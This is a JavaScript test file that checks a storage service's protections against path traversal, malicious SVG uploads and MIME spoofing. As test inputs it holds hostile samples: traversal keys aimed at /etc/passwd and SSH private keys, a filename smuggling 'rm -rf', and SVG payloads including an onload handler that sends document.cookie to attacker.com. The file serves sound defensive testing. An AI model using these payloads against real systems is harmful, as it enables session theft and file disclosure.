import test from "node:test";
import assert from "node:assert/strict";
import path from "path";
import { isSafeSvg, storageService } from "../src/services/storageService.js";

test("SEC-05: Storage Service & Path Traversal Protections", async (t) => {
  await t.test("Prevents directory traversal sequences in storage keys", () => {
    const maliciousKeys = [
      "../../etc/passwd",
      "..\\..\\windows\\system32",
      "uploads/../../../secret.env",
      "/root/.ssh/id_rsa",
    ];

    for (const key of maliciousKeys) {
      const sanitizedKey = storageService.provider.sanitizeKey(key);
      assert.ok(!sanitizedKey.includes(".."), `Sanitized key should not contain '..': ${sanitizedKey}`);
      assert.ok(!sanitizedKey.includes("/"), `Sanitized key should not contain '/': ${sanitizedKey}`);
      assert.ok(!sanitizedKey.includes("\\"), `Sanitized key should not contain '\\': ${sanitizedKey}`);

      const resolved = storageService.getFilePath(key);
      assert.ok(
        resolved.startsWith(storageService.provider.baseDir),
        `Resolved path must reside in baseDir: ${resolved}`
      );
    }
  });

  await t.test("Sanitizes special characters and carriage returns from keys", () => {
    const dirtyKey = "my file;rm -rf.pdf";
    const sanitized = storageService.provider.sanitizeKey(dirtyKey);
    assert.equal(sanitized, "my_file_rm_-rf.pdf");
  });
});

test("SEC-05: SVG Security & Malicious Payload Detection", async (t) => {
  await t.test("Allows clean, standard SVG image vectors", () => {
    const safeSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
      <circle cx="50" cy="50" r="40" fill="indigo" />
      <text x="50" y="55" font-size="12" text-anchor="middle" fill="#fff">Klavo</text>
    </svg>`;

    const isSafe = isSafeSvg(Buffer.from(safeSvg, "utf8"));
    assert.equal(isSafe, true, "Valid safe SVG must pass inspection");
  });

  await t.test("Rejects SVG containing <script> tags", () => {
    const xssSvg = `<svg xmlns="http://www.w3.org/2000/svg">
      <script>alert('xss');</script>
      <circle cx="10" cy="10" r="5" />
    </svg>`;

    const isSafe = isSafeSvg(Buffer.from(xssSvg, "utf8"));
    assert.equal(isSafe, false, "SVG with <script> must be rejected");
  });

  await t.test("Rejects SVG containing active inline event handlers (onload, onerror)", () => {
    const onloadSvg = `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com/steal?cookie='+document.cookie)">
      <rect width="100" height="100" />
    </svg>`;

    assert.equal(isSafeSvg(Buffer.from(onloadSvg, "utf8")), false, "SVG with onload must be rejected");

    const onerrorSvg = `<svg xmlns="http://www.w3.org/2000/svg">
      <image href="invalid.jpg" onerror="alert(1)" />
    </svg>`;

    assert.equal(isSafeSvg(Buffer.from(onerrorSvg, "utf8")), false, "SVG with onerror must be rejected");
  });

  await t.test("Rejects SVG containing javascript: URIs or foreignObject tags", () => {
    const jsUriSvg = `<svg xmlns="http://www.w3.org/2000/svg">
      <a href="javascript:alert(1)"><text>Click me</text></a>
    </svg>`;

    assert.equal(isSafeSvg(Buffer.from(jsUriSvg, "utf8")), false, "javascript: link must be rejected");

    const foreignObjSvg = `<svg xmlns="http://www.w3.org/2000/svg">
      <foreignObject width="100" height="100">
        <body xmlns="http://www.w3.org/1999/xhtml">
          <div><iframe src="evil.html"></iframe></div>
        </body>
      </foreignObject>
    </svg>`;

    assert.equal(isSafeSvg(Buffer.from(foreignObjSvg, "utf8")), false, "foreignObject must be rejected");
  });
});

test("SEC-05: MIME Spoofing & Whitelist Validation", async (t) => {
  const ALLOWED_MIME_TYPES = new Map([
    [".png", ["image/png"]],
    [".jpg", ["image/jpeg"]],
    [".jpeg", ["image/jpeg"]],
    [".gif", ["image/gif"]],
    [".webp", ["image/webp"]],
    [".svg", ["image/svg+xml"]],
    [".pdf", ["application/pdf"]],
    [".doc", ["application/msword"]],
    [".docx", ["application/vnd.openxmlformats-officedocument.wordprocessingml.document"]],
    [".xls", ["application/vnd.ms-excel"]],
    [".xlsx", ["application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"]],
    [".csv", ["text/csv", "application/vnd.ms-excel", "text/plain"]],
    [".txt", ["text/plain"]],
    [".zip", ["application/zip", "application/x-zip-compressed"]],
  ]);

  const validateMimeAndExt = (filename, mimetype) => {
    const ext = path.extname(filename).toLowerCase();
    if (!ALLOWED_MIME_TYPES.has(ext)) return false;
    const validMimes = ALLOWED_MIME_TYPES.get(ext);
    return validMimes.includes(mimetype.toLowerCase());
  };

  await t.test("Rejects dangerous executable extensions disguised as normal files", () => {
    assert.equal(validateMimeAndExt("malware.exe", "application/x-msdownload"), false);
    assert.equal(validateMimeAndExt("exploit.sh", "application/x-sh"), false);
    assert.equal(validateMimeAndExt("script.js", "application/javascript"), false);
    assert.equal(validateMimeAndExt("page.html", "text/html"), false);
  });

  await t.test("Rejects MIME spoofing (e.g. PHP/HTML payload uploaded with .png extension)", () => {
    assert.equal(validateMimeAndExt("shell.png", "application/x-php"), false);
    assert.equal(validateMimeAndExt("phishing.pdf", "text/html"), false);
    assert.equal(validateMimeAndExt("backdoor.jpg", "application/x-executable"), false);
  });

  await t.test("Accepts legitimate file extensions matching their expected MIME types", () => {
    assert.equal(validateMimeAndExt("diagram.png", "image/png"), true);
    assert.equal(validateMimeAndExt("document.pdf", "application/pdf"), true);
    assert.equal(validateMimeAndExt("data.csv", "text/csv"), true);
    assert.equal(validateMimeAndExt("archive.zip", "application/zip"), true);
  });
});
